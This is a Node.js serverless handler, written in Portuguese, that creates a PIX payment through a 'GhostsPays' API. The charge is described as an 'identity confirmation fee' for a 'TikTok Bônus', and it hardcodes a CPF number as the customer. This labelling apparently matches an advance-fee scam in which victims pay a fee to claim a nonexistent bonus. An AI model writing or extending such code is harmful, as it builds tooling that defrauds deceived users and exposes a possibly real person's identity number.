const GHOSTSPAY_BASE_URL = 'https://api.ghostspaysv2.com/functions/v1';

function buildAuthHeader(secretKey, companyId) {
  const credentials = Buffer.from(`${secretKey}:${companyId}`).toString('base64');
  return `Basic ${credentials}`;
}

async function callGhostsPays(endpoint, options) {
  const url = `${GHOSTSPAY_BASE_URL}${endpoint}`;
  const resp = await fetch(url, options);
  const text = await resp.text();
  let json;
  try {
    json = text ? JSON.parse(text) : null;
  } catch (e) {
    json = { raw: text };
  }
  return { status: resp.status, body: json };
}

module.exports = async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: { code: 'METHOD_NOT_ALLOWED', message: 'Use POST' } });
  }

  const secretKey = process.env.GHOSTSPAY_SECRET_KEY || '';
  const companyId = process.env.GHOSTSPAY_COMPANY_ID || '';
  const postbackUrl = process.env.GHOSTSPAY_POSTBACK_URL || '';

  if (!secretKey || !companyId) {
    return res.status(500).json({
      error: {
        code: 'MISSING_CREDENTIALS',
        message: 'Configuração GhostsPays ausente. Defina GHOSTSPAY_SECRET_KEY e GHOSTSPAY_COMPANY_ID.'
      }
    });
  }

  const cpfNumero = '11238990533';
  const amount = 3956;

  const payload = {
    customer: {
      name: 'CPF 112.389.905-33',
      email: 'cpf11238990533@example.com',
      phone: '11999999999',
      document: {
        number: cpfNumero,
        type: 'CPF'
      }
    },
    paymentMethod: 'PIX',
    amount,
    items: [
      {
        title: 'Taxa de confirmação de identidade',
        unitPrice: amount,
        quantity: 1
      }
    ],
    pix: {
      expiresInDays: 1
    },
    description: 'Taxa de confirmação TikTok Bônus',
    metadata: {
      flow: 'tiktok_bonus',
      cpf: cpfNumero,
      chavePix: cpfNumero
    }
  };

  if (postbackUrl) {
    payload.postbackUrl = postbackUrl;
  }

  try {
    const { status, body } = await callGhostsPays('/transactions', {
      method: 'POST',
      headers: {
        Authorization: buildAuthHeader(secretKey, companyId),
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    });

    res.status(status).json(body);
  } catch (e) {
    console.error('[GhostsPays] Erro ao criar pagamento PIX:', e);
    res.status(500).json({
      error: {
        code: 'INTERNAL_ERROR',
        message: 'Falha ao comunicar com a API GhostsPays.'
      }
    });
  }
}
